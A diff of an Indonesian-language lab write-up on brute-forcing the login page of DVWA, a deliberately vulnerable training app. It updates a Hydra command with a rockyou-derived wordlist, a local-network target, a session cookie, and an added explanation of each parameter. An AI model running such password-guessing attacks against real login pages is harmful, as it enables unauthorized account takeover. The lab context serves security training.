@@ -54,13 +54,17 @@ Dari intercepted request yang terdapat di Burp Suite pada percobaan pertama, hal
 
 > hydra -l admin \
 >
->   -P ~/dvwa_wordlist.txt \
+>   -P /usr/share/wordlists/simplified_rockyou.txt \
 >
->   127.0.0.1 \
+>   192.168.1.10 \
 >
 >   http-get-form \
 >
->   "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie: PHPSESSID=abc123xyz; security=low:F=Username and/or password incorrect."
+>   "/DVWA/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie: PHPSESSID=857da***dfe44; security=low:F=Username and/or password incorrect."
+
+**Penjelasan:**
+5 baris bash command yang digunakan dengan tool Hydra dimaksudkan untuk mengotomatisasi serangan terhadap login page secara bertubi-tubi sebanyak ditemukkannya pasangan kredensial (username & password) yang sesuai. Parameter yang perlu diperhatikan pada command ini antara lain: IPv4 address target, path file teks (.txt) yang berisikan daftar password yang akan dicoba, path DVWA brute, dan Session ID.
+
 
 **Tahap 4: Verification**
 
